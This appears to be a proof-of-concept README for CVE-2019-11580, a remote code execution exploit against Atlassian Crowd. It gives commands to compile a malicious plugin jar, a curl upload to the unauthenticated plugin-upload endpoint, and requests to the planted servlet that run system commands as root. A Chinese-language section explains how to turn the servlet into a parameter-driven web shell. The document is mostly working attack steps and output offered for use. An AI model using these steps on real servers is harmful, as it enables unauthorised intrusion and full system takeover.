# CVE-2019-11580
## Atlassian Crowd and Crowd Data Center RCE

#### Vuln_Version Donwload
`https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-2.11.0.tar.gz`

![](./getshell_success.jpg)



### 0x01 compile for rce.jar
`javac -cp servlet-api.jar com/cdl/shell/exp.java`

`zip -r rce.jar atlassian-plugin.xml ./com`

```
./compile.sh
updating: atlassian-plugin.xml (deflated 54%)
updating: com/ (stored 0%)
updating: com/cdl/ (stored 0%)
updating: com/cdl/shell/ (stored 0%)
updating: com/cdl/shell/exp.java (deflated 59%)
updating: com/cdl/shell/exp.class (deflated 45%)

```
### 0x02 upload rce.jar to crowd/admin/uploadplugin.action
```
curl -k -H "Content-Type: multipart/mixed" \
  --form "file_cdl=@rce.jar" http://xx.xx.xx.xx/crowd/admin/uploadplugin.action
  
Installed plugin /opt/atlassian/crowd/apache-tomcat/temp/plugindev-1059463178748466378rce.jar

```

### 0x03 get shell

```
curl "http://xx.xx.xx.xx/crowd/plugins/servlet/exp?cmd=whoami"
>>> root

curl "http://xx.xx.xx.xx/crowd/plugins/servlet/exp?cmd=id"
>>> uid=0(root) gid=0(root) groups=0(root)

```

##### 自定义cmd值：
```
https://github.com/lc/research/blob/master/CVE-2019-11580/atlassian-shell/com/cdl/shell/Cdl.java

原代码String cmd="whoami";
修改为String cmd=String.valueOf(req.getParameter("cmd"));
```
### 参考链接

```
https://www.corben.io/atlassian-crowd-rce/
https://github.com/lc/research/tree/master/CVE-2019-11580/atlassian-shell
```
